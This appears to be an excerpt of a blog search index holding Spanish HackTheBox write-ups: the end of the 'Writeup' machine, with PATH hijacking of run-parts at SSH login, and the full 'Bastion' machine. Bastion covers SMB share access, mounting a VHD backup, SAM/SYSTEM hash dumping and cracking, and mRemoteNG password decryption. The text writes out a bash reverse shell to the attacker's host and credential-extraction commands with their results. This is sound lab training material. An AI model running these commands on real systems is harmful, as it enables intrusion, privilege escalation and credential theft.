servicio SSH vemos (bueno, estaba ciego y no lo habia visto) algo interesante: Vemos que al iniciar una sesi√≥n alg√∫n usuario por medio de SSH se le asigna la variable $PATH con varias rutas (ya miraremos esto), peeeeeeeeeero, tambien vemos la ejecuci√≥n de dos comandos sin su ruta absoluta :o Ac√° ya podemos pensar en algo relacionado o parecido al PATH Hijacking: Validando en que ruta esta el binario sh tenemos: jkr@writeup:/tmp$ which sh/bin/shBien, y ahora validando la variable $PATH: jkr@writeup:/tmp$ echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games¬øComo se relacionan esas dos instrucciones? Muy sencillo: Al ejecutar sh (sin ruta absoluta (ejecutando con ruta absoluta seria /bin/sh)), el sistema necesita saber en donde esta el binario relacionado a esa cadena  sh , entonces va a la variable $PATH y empieza a recorrer cada uno del los directorios que se encuentran en ella, entonces: # Ejecutamos *whoami*jkr@writeup:/tmp$ sh -c whoami. . . # Busca el binario  sh  en las rutas:/usr/local/bin /usr/bin/bin. . . Si lo encuentra en alguna, por ejemplo: /usr/local/bin/sh, lo ejecuta y termina de buscar, si no, sigue con la siguiente ruta hasta encontrarlo :P, asi de sencillo. Teniendo esto en mente, podemos empezar a jugar‚Ä¶ Sabemos que el sistema ejecuta sh al iniciar sesion con SSH, pues empezara a buscar en las rutas del $PATH y lo encontraria en /bin, peeeero, podemos simplemente crear un archivo que se llame sh y moverlo a la ruta /usr/local/bin, al iniciar sesion con SSH el sistema buscara de nuevo pero ahora lo encontrara primero en esa ruta, por lo tanto ser√° ejecutado :) Ac√° no tenemos que preocuparnos en cambiar el valor de la varibale $PATH (que por lo general debemos hacer lo en un PATH Hijacking), entonces nnos quitamos un paso, demosle: Como prueba, hagamos que el archivo nos cree otro archivo (e. e) al ser ejecutado, asi validamos que tamos haciendo las cosas bien: jkr@writeup:/tmp$ echo  echo 'hola, escrito reemplazando el binario sh' &gt; /tmp/sh_patHijack. txt  &gt; shjkr@writeup:/tmp$ cat sh echo 'hola, escrito reemplazando el binario sh' &gt; /tmp/sh_patHijack. txtSi se ejecuta, tendremos el archivo sh_patHijack. txt en la ruta /tmp. Le damos permisos de ejecuci√≥n y lo movemos a la ruta /usr/local/bin: jkr@writeup:/tmp$ chmod +x sh jkr@writeup:/tmp$ cp sh /usr/local/bin/jkr@writeup:/tmp$ ls -la /usr/local/bin/sh-rwxr-xr-x 1 jkr staff 72 Jun 6 20:18 /usr/local/bin/sh  Usamos la otra terminal e iniciamos sesi√≥n, validamos si se genero el archivo: jkr@writeup:~$ ls -la /tmp/ | grep sh-rwxr-xr-x 1 jkr jkr    72 Jun 6 20:16 shPero no, no pasa nada‚Ä¶ Si recordamos, hay otro comando que se esta ejecutando llamado run-parts:  run-parts - Ejecuta scripts o programas en un directorio. Pues podemos hacer exactamente el mismo procedimiento, validamos que ruta tiene el binario por default, vemos si es necesario modificar la variable $PATH (no es necesario), generamos un archivo que se llame igual al original, damos permisos, movemos a la ruta /usr/local/bin y entramos con SSH. Veamos entonces: jkr@writeup:/tmp$ echo  echo 'hola, escrito reemplazando el binario run-parts' &gt; /tmp/run_patHijack. txt  &gt; run-parts  jkr@writeup:/tmp$ chmod +x run-partsjkr@writeup:/tmp$ cp run-parts /usr/local/bin/jkr@writeup:/tmp$ ls -la /usr/local/bin/run-parts-rwxr-xr-x 1 jkr staff 80 Jun 6 20:25 /usr/local/bin/run-parts. . . ‚ù± ssh jkr@10. 10. 10. 138. . . jkr@writeup:~$ ls -la /tmp | grep run-rwxr-xr-x 1 jkr jkr    80 Jun 6 20:24 run-parts-rw-r--r-- 1 root root   48 Jun 6 20:26 run_patHijack. txtjkr@writeup:~$ cat /tmp/run_patHijack. txt hola, escrito reemplazando el binario run-partsOpa ü§∏‚Äç‚ôÄÔ∏è Pues ha funcionaaaao (: Ahora podemos usar el PATH Hijacking para ejecutar cualquier comando como el usuario root, pues entablemonos una reverse shell ah√≠ de rapidez: jkr@writeup:/tmp$ echo  bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 16/4433 0&gt;&amp;1'  &gt; run-parts  jkr@writeup:/tmp$ cat run-parts bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 16/4433 0&gt;&amp;1'jkr@writeup:/tmp$ cp run-parts /usr/local/bin/jkr@writeup:/tmp$ ls -la /usr/local/bin/run-parts-rwxr-xr-x 1 jkr staff 52 Jun 6 21:31 /usr/local/bin/run-parts LISTONEEEEEEEEEEEEEEEEEEEEEEEEEEEEEES!! Tamos dentro como el usuario root, echemosle un ojo a las flags: Emho akabhao‚Äô ‚Ä¶ Linda experiencia. El PATH Hijacking estuvo lindo, pero me gusto m√°s el como lo encontramos‚Ä¶ Listoooooooones‚Ä¶ Vamos caminando por un desierto (e. e), miramos el techo (u. u) y nos encontramos una nota en el suelo (o. o) y dice: ‚ÄúA seguir rompiendo TODO!!‚Äù ‚ù§Ô∏è "
    }, {
    "id": 45,
    "url": "http://localhost:4000/htb/bastion",
    "title": "HackTheBox - Bastion",
    "body": "2021/06/08 - M√°quina Windows nivel f√°cil. Nos moveremos con Samba, jugaremos con el backup de una m√°quina virtual Windows para extraer los archivos SAM y SYSTEM‚Ä¶ Crackearemos cosillas y nos daremos cuenta que un software guarda contrase√±as de acceso al sistema, ¬øqu√© procede? e. e TL;DR (Spanish writeup): Creada por: L4mpje. ARAGANEEEEEEEEEEEEEEEZ! A jugar. Nos enfrentaremos a carpetas compartidas mediante SMB, una de ellas tendr√° un Backup de una m√°quina virtual Windows, jugando con algunas herramientas y archivos (SAM y SYSTEM) obtendremos los hashes NTLM de los usuarios Administrator, L4mpje y Guest. Jugaremos con cracking para obtener la contrase√±a en texto plano del usuario L4mpje, conseguiremos una sesi√≥n mediante SSH como √©l en el sistema. Enumerando la m√°quina veremos que existe un programa llamado mRemoteNG (que se encarga entre otras cosas de proveer conexi√≥n entre protocolos (RDP, SSH, telnet, etc‚Ä¶)), en la web nos indican que ese servicio guarda las credenciales que se han usado para conectarse a otros protocolos (dichos antes, como SSH), encontraremos que se guardan en un objeto llamado confCons. xml, dentro est√°n las credenciales encriptadas, usando mRemoteNG-Decrypt conseguiremos desencriptarlas y obtener la contrase√±a en texto plano usada por el usuario Administrator para conectarse al sistema‚Ä¶ ¬øQu√© har√≠as? A darle. ‚Ä¶ Clasificaci√≥n de la m√°quina:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ BUAAAJAJAAAAAaaaaaa, a rompernos!!  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Como nunca hemos hecho, vamos a empezar por un escaneo de puertos mediante nmap, as√≠ vemos por donde empezar a jugar: ‚ù± nmap -p- --open -v 10. 10. 10. 134 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   Nos responde: # Nmap 7. 80 scan initiated Wed Jun 2 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 134# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 134 ()  Status: UpHost: 10. 10. 10. 134 ()  Ports: 22/open/tcp//ssh///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 5985/open/tcp//wsman///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////# Nmap done at Wed Jun 2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 76. 08 secondsPor lo tanto, tenemos:       Puerto   Descripci√≥n         22   SSH       135   RPC       139   SMB       445   SMB       5985, 47001   WinRM       49664, 49665, 49666, 49667, 49668, 49669, 49670   Desconocidos   Ahora hacemos un escaneo m√°s profundo con base en los puertos encontrados, as√≠ podemos investigar sobre que servicio es cada puerto, posiblemente su software y si tiene scripts de nmap relacionados: ~(Para copiar los puertos directamente en la clipboard, hacemos uso de la funci√≥n referenciada antes ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 134  [*] Open ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV 10. 10. 10. 134 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   La respuesta es: # Nmap 7. 80 scan initiated Wed Jun 2 25:25:25 2021 as: nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN portScan 10. 10. 10. 134Nmap scan report for 10. 10. 10. 134Host is up (0. 11s latency). PORT   STATE SERVICE   VERSION22/tcp  open ssh     OpenSSH for_Windows_7. 9 (protocol 2. 0)| ssh-hostkey: |  2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|  256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)135/tcp  open msrpc    Microsoft Windows RPC139/tcp  open netbios-ssn Microsoft Windows netbios-ssn445/tcp  open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found49664/tcp open msrpc    Microsoft Windows RPC49665/tcp open msrpc    Microsoft Windows RPC49666/tcp open msrpc    Microsoft Windows RPC49667/tcp open msrpc    Microsoft Windows RPC49668/tcp open msrpc    Microsoft Windows RPC49669/tcp open msrpc    Microsoft Windows RPC49670/tcp open msrpc    Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -28m59s, deviation: 1h09m15s, median: 10m58s| smb-os-discovery: |  OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6. 3)|  Computer name: Bastion|  NetBIOS computer name: BASTION\x00|  Workgroup: WORKGROUP\x00|_ System time: 2021-06-02T18:56:49+02:00| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-06-02T16:56:51|_ start_date: 2021-06-02T16:33:48Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Jun 2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74. 97 secondsCositas interesantes tenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH for_Windows_7. 9       445   SMB   Windows Server 2016 Standard 14393       5985, 47001   WinRM   Microsoft HTTPAPI httpd 2. 0   Un sistema operativo del servidor Samba, pero poco podemos hacer desde ya, as√≠ que empecemos a ver por donde entrar :s ‚Ä¶ Puertos 139-445 SAMBA ‚åñ: SAMBA en t√©rminos generales permite a nodos de una red compartir informaci√≥n (: Corto y sencillo e. e Podemos jugar con la herramienta smbmap para ver si existen recursos compartidos en la red, como no tenemos usuarios a√∫n, probamos con una sesi√≥n nula: ‚ù± smbmap -H 10. 10. 10. 134 -u '' -p '' [!] Authentication error on 10. 10. 10. 134Pero jugando: ‚ù± smbmap -H 10. 10. 10. 134 -u '' -p ' '[+] Guest session    IP: 10. 10. 10. 134:445  Name: unknown                      [-] Work[!] Unable to remove test directory at \\10. 10. 10. 134\Backups\WGLCGDJOHA, please remove manually    Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    Backups                         READ, WRITE    C$                           NO ACCESS    Default share    IPC$                          READ ONLY    Remote IPC(Tambi√©n funciona as√≠: ‚ù± smbmap -H 10. 10. 10. 134 -u 'null' -p 'null') Bien, vemos 4 recursos, pero solo tenemos acceso de lectura a 2 de ellos: Backups y IPC$, para ver el contenido de esos directorios nos apoyamos de la herramienta smbclient, empecemos por Backups: ‚ù± smbclient //10. 10. 10. 134/Backups -U ''Enter WORKGROUP\'s password: Try  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Tue Apr 16 05:02:11 2019 . .                  D    0 Tue Apr 16 05:02:11 2019 note. txt              AR   116 Tue Apr 16 05:10:09 2019 SDT65CB. tmp             A    0 Fri Feb 22 07:43:08 2019 WindowsImageBackup         Dn    0 Fri Feb 22 07:44:02 2019        7735807 blocks of size 4096. 2752055 blocks availablesmb: \&gt; Opa, vemos algunos archivos y un directorio, para trabajar c√≥modos vamos a descargarnos todo el directorio Backups a nuestro sistema, lo podemos hacer tambi√©n con smbclient: smb: \&gt; prompt offsmb: \&gt; recurse onsmb: \&gt; mget *getting file \note. txt of size 116 as note. txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)getting file \SDT65CB. tmp of size 0 as SDT65CB. tmp (0,0 KiloBytes/sec) (average 0,2 KiloBytes/sec)getting file \WindowsImageBackup\L4mpje-PC\MediaId of size 16 as WindowsImageBackup/L4mpje-PC/MediaId (0,0 KiloBytes/sec) (average 0,1 KiloBytes/sec)Pero se queda ah√≠ un rato, para ver el tama√±o de lo que estamos descargando podemos usar smbget que tambi√©n nos permite descargar directorios compartidos mediante samba: ‚ù± smbget -R smb://10. 10. 10. 134/Backups -U ''Password for [] connecting to //Backups/10. 10. 10. 134: Using workgroup WORKGROUP, guest usersmb://10. 10. 10. 134/Backups/note. txtsmb://10. 10. 10. 134/Backups/SDT65CB. tmpsmb://10. 10. 10. 134/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963. vhd[WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963. vhd] 2,50MB of 5,05GB . . . Pues con raz√≥n u. u 5. 05 gigas se me descarga en 3 d√≠as (: Lo mejor en este caso, es hacer una montura de la carpeta compartida, as√≠ no tenemos que descargar nada (actualicen cifs-utils, me daba problemas y actualiz√°ndolo se solucion√≥): ‚ù± mkdir /mnt/Backups‚ù± mount -t cifs -o username=' ' //10. 10. 10. 134/Backups /mnt/BackupsPassword for @//10. 10. 10. 134/Backups: Y obtenemos: ‚ù± tree /mnt/Backups//mnt/Backups/‚îú‚îÄ‚îÄ note. txt‚îú‚îÄ‚îÄ SDT65CB. tmp‚îî‚îÄ‚îÄ WindowsImageBackup  ‚îî‚îÄ‚îÄ L4mpje-PC    ‚îú‚îÄ‚îÄ Backup 2019-02-22 124351    ‚îÇ  ‚îú‚îÄ‚îÄ 9b9cfbc3-369e-11e9-a17c-806e6f6e6963. vhd    ‚îÇ  ‚îú‚îÄ‚îÄ 9b9cfbc4-369e-11e9-a17c-806e6f6e6963. vhd    ‚îÇ  ‚îú‚îÄ‚îÄ BackupSpecs. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Components. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4. xml    ‚îÇ  ‚îú‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2. xml    ‚îÇ  ‚îî‚îÄ‚îÄ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220. xml    ‚îú‚îÄ‚îÄ Catalog    ‚îÇ  ‚îú‚îÄ‚îÄ BackupGlobalCatalog    ‚îÇ  ‚îî‚îÄ‚îÄ GlobalCatalog    ‚îú‚îÄ‚îÄ MediaId    ‚îî‚îÄ‚îÄ SPPMetadataCache      ‚îî‚îÄ‚îÄ {cd113385-65ff-4ea2-8ced-5630f6feca8f}5 directories, 19 filesListones, varios archivos a enumerar :P Una nota: ‚ù± cat note. txt Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow. Del resto de archivos solo tenemos dos llamativos: ‚ù± file *9b9cfbc3-369e-11e9-a17c-806e6f6e6963. vhd:                           Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1. 1 (W2k) Fri Feb 22 12:44:00 2019, 104970240 bytes, CHS 1005/12/17, State 0x19b9cfbc4-369e-11e9-a17c-806e6f6e6963. vhd:                           Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1. 1 (W2k) Fri Feb 22 12:44:01 2019, 15999492096 bytes, CHS 31001/16/63, State 0x1BackupSpecs. xml:                                       datacd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7. xml: datacd113385-65ff-4ea2-8ced-5630f6feca8f_Components. xml:                     datacd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes. xml:                  datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f. xml:     datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f. xml:     datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0. xml:     datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485. xml:     datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4. xml:     datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2. xml:     datacd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220. xml:     dataIntentando con strings o cat ante los . xml no logramos ver nada‚Ä¶ Buscando en internet y gui√°ndonos por la descripci√≥n de los archivos, vemos que un objeto . vhd es usado para almacenar backups de discos duros virtuales (m√°quinas virtuales).  May include disk partitions, a file system, files, and folders. VHD extension. Bien, dando algunos pasos por ah√≠ encontramos este recurso:  How to mount VHD files. Sigui√©ndolo podemos aprovechar la m√°quina virtual (backup) que conseguimos para montarla y ver que hay, esto lo logramos con la herramienta guestmount: ‚ù± mkdir /mnt/vhd‚ù± guestmount --add  /mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963. vhd  --inspector --ro -v /mnt/vhd/   . . . Yyyyy: ‚ù± pwd/mnt/vhd‚ù± ls -lhtotal 2,0Gdrwxrwxrwx 1 root root  0 feb 22 2019 '$Recycle. Bin'-rwxrwxrwx 1 root root  24 jun 10 2009 autoexec. bat-rwxrwxrwx 1 root root  10 jun 10 2009 config. syslrwxrwxrwx 2 root root  14 jul 13 2009 'Documents and Settings' -&gt; /sysroot/Users  -rwxrwxrwx 1 root root 2,0G feb 22 2019 pagefile. sysdrwxrwxrwx 1 root root  0 jul 13 2009 PerfLogsdrwxrwxrwx 1 root root 4,0K abr 11 2011 'Program Files'drwxrwxrwx 1 root root 4,0K jul 13 2009 ProgramDatadrwxrwxrwx 1 root root  0 feb 22 2019 Recoverydrwxrwxrwx 1 root root 4,0K feb 22 2019 'System Volume Information'drwxrwxrwx 1 root root 4,0K feb 22 2019 Usersdrwxrwxrwx 1 root root 16K feb 22 2019 WindowsPerfecto, tenemos el contenido de la m√°quina virtual, ahora nos queda recorrer directorios importantes y ver con que podemos jugar‚Ä¶ ‚Ä¶ Explotaci√≥n #: Peeero antes de enloquecernos con tanto archivo, vamos a la fija, ya que es un backup de todo el sistema, debemos tener acceso a los archivos SAM y SYSTEM, ya que entre los dos tienen las passwords de los usuarios en formato hash NTLM.  What is Security Accounts Manager (SAM).  Registros en Windows. Por lo general est√°n en la ruta Windows/System32/config: ‚ù± pwd/mnt/vhd/Windows/System32/config‚ù± ls -lhtotal 73M. . . -rwxrwxrwx 1 root root 256K feb 22 2019 SAM. . . -rwxrwxrwx 1 root root 9,3M feb 22 2019 SYSTEM  . . . Y si (: Ahora, juntando los archivos con la herramienta samdump2 podemos obtener los hashes de cada usuario, posteriormente podemos intentar PassTheHash o crackearlos: ‚ù± samdump2 SYSTEM SAM *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::Tres usuarios y dos de ellos dicen disabled (ni idea que significara en el contexto), tomemos la √∫ltima parte de los hashes (que si nos fijamos, es la √∫nica parte que es din√°mica) y guard√©mosla en un archivo: ‚ù± cat ntlm. hashes Administrator:31d6cfe0d16ae931b73c59d7e0c089c0  Guest:31d6cfe0d16ae931b73c59d7e0c089c0L4mpje:26112010952d963c8dc4217daec986d9Bien‚Ä¶ Estuve probando con evil-winrm, psexec, wmiexec y crackmapexec con los hashes para hacer PassTheHash, pero no tuve √©xito, as√≠ que solo nos queda intentar crackearlos, usando John The Ripper logramos esto, debemos pasarle unos par√°metros: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt --format=NT ntlm. hashes --wordlist: El archivo con el que queremos que itere cada hash en busca de similitudes.  --format: El formato en el que est√°n los hashes, en nuestro caso NTLM (o NT para john). Tenemos: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt --format=NT ntlm. hashesUsing default input encoding: UTF-8Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])Press 'q' or Ctrl-C to abort, almost any other key for status         (Administrator)bureaulampje   (L4mpje)2g 0:00:00:02 DONE (2021-06-03 00:30) 0. 8849g/s 4157Kp/s 4157Kc/s 4159KC/s burg772v. . burdy1  Warning: passwords printed above might not be all those crackedUse the  --show --format=NT  options to display all of the cracked passwords reliablySession completed‚ù± john --show --format=NT ntlm. hashes Administrator:Guest:L4mpje:bureaulampje3 password hashes cracked, 0 leftDe los 3 usuarios encontr√≥ el resultado del hash de L4mpje, el cual da como contrase√±a a bureaulampje ‚ú® Despues de algo de tiempo muerto jugando con las herramientas que use para el PassTheHash no consegu√≠ hacer funcionar las credenciales, pero con crackmapexec pude confirmar que si son v√°lidas: ‚ù± crackmapexec smb 10. 10. 10. 134 -u 'L4mpje' -p 'pwincorrecta?'SMB     10. 10. 10. 134  445  BASTION     [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)SMB     10. 10. 10. 134  445  BASTION     [-] Bastion\L4mpje:pwincorrecta? STATUS_LOGON_FAILURE‚ù± crackmapexec smb 10. 10. 10. 134 -u 'L4mpje' -p 'bureaulampje'SMB     10. 10. 10. 134  445  BASTION     [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)SMB     10. 10. 10. 134  445  BASTION     [+] Bastion\L4mpje:bureaulampje¬øSe ve la diferencia? e. e Al no saber donde m√°s probar las credenciales, echamos un ojo al escaneo de nmap que hicimos y pues s√≠, hab√≠a algo que no hab√≠amos probado, el puerto 22 (SSH), validemos si por ah√≠ las credenciales nos permiten entrar: (Pues como casi nunca est√° en una m√°quina Windows pues ni me acordaba de √©l :P) ‚ù± ssh L4mpje@10. 10. 10. 134L4mpje@10. 10. 10. 134's password: BOOOM! Tamos dentro del sistema como el usuario L4mpje :o ‚Ä¶ Ac√° ya podemos borrar las monturas, ya que no nos van a ser de utilidad (espero que no :P) ‚ù± umount /mnt/vhd‚ù± umount /mnt/BackupsSigamos. ‚Ä¶ Escalada de privilegios #: Despues de un rato profundizando, encontramos un rabbit hole en el directorio C:\Logs (que suena llamativo, pero no hay nada √∫til üôÉ)‚Ä¶ Peeeero, finalmente encontramos algo llamativo y distinto: PS C:\Program Files (x86)&gt; dir  Directory: C:\Program Files (x86)Mode        LastWriteTime     Length Name----        -------------     ------ ----d-----    16-7-2016   15:23        Common Filesd-----    23-2-2019   09:38        Internet Explorerd-----    16-7-2016   15:23        Microsoft. NETda----    22-2-2019   14:01        mRemoteNGd-----    23-2-2019   10:22        Windows Defenderd-----    23-2-2019   09:38        Windows Maild-----    23-2-2019   10:22        Windows Media Playerd-----    16-7-2016   15:23        Windows Multimedia Platform  d-----    16-7-2016   15:23        Windows NTd-----    23-2-2019   10:22        Windows Photo Viewerd-----    16-7-2016   15:23        Windows Portable Devicesd-----    16-7-2016   15:23        WindowsPowerShellPS C:\Program Files (x86)&gt;Ven algo raro? ¬Ø_(„ÉÑ)_/¬Ø Pues s√≠, hay un programa llamado mRemoteNG que normalmente no viene en los sistemas Windows, esto nos da un punto de partida para al menos ver de que se trata:  Este programa te permite administrar, en un mismo programa y con una interfaz muy sencilla y amigable, m√∫ltiples conexiones con diferentes protocolos. ¬ømRemoteNG?. Tales como:  RDP, VNC, SSH, Telnet, rlogin and other protocols. mremoteng store passwords. Y si, como se ve en la referencia anterior, encontramos una vulnerabilidad para ese servicio ü§≠, ya que administra varios conexiones entre protocolos, pero guarda las credenciales que se usan para esas conexiones ‚ö†Ô∏è  It saves the passwords in an encrypted format. mremoteng store passwords. Investigando donde las guarda, encontramos el m√≥dulo de metasploit al que se hace referencia y dentro el archivo con el que juega para extraer las credenciales:  metasploit-framework/mremote. rb. Tenemos dos rutas para probar y buscar el archivo llamado confCons. xml o hacer una b√∫squeda recursiva sobre todo el directorio C:\Users y ver si encuentra el objeto, hagamos esa opci√≥n: PS C:\Program Files (x86)&gt; Get-Childitem -Path C:\Users\ -Filter confCons. xml -recurse -ErrorAction SilentlyContinue -Force   Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNGMode        LastWriteTime     Length Name----        -------------     ------ -----a----    22-2-2019   14:03      6316 confCons. xmlPS C:\Program Files (x86)&gt;Le indicamos que busque en el directorio C:\Users y que filtre por un archivo llamado confCons. xml, que lo haga recursivamente (en todos los directorios) y fuerce a buscar archivos ocultos yyyy que si encuentra alg√∫n error lo salte y siga buscando. Y lo encontramos üî• lo tenemos en la ruta: C:\Users\L4mpje\AppData\Roaming\mRemoteNGVeamos si es cierto üò¨ PS C:\Program Files (x86)&gt; ls C:\Users\L4mpje\AppData\Roaming\mRemoteNG  Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNGMode        LastWriteTime     Length Name----        -------------     ------ ----. . . -a----    22-2-2019   14:03      6316 confCons. xml. . . PS C:\Program Files (x86)&gt;Y si, pues viendo su contenido encontramos las contrase√±as de las que se hablaban: PS C:\Program Files (x86)&gt; type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons. xmlVemos unas credenciales del usuario Administrator: Y otras del usuario L4mpje: Pero, est√°n encriptadas, como las desencriptamos ‚ùì Con una simple b√∫squeda de decrypt mremoteng en la web, obtenemos este recurso que se encarga de esa tarea:  https://github. com/haseebT/mRemoteNG-Decrypt. Lo clonamos y simplemente debemos pasarle la contrase√±a encriptada, probemos con la del usuario Administrator primero y despues con la de L4mpje: ‚ù± python3 mRemoteNG-Decrypt/mremoteng_decrypt. py -s  aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==   Password: thXLHM96BeKL0ER2‚ù± python3 mRemoteNG-Decrypt/mremoteng_decrypt. py -s  yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB   Password: bureaulampje(Es la misma con la que ingresamos por medio de SSH). Perfecto, pues probemos esa contrase√±a del usuario Administrator contra el servicio SSH: ‚ù± ssh Administrator@10. 10. 10. 134Administrator@10. 10. 10. 134's password:  Colocamos la contrase√±a y obtenemos: LISSSSSSSSSSTO, tamos dentroooooooooooo üöÄ Veamos las flags‚Ä¶ ‚Ä¶ Bonita m√°quina, bastante juguetona y de enumerar bien, me gusto el tema de las monturas y el tener que jugar con un backup de una m√°quina virtual, lindo 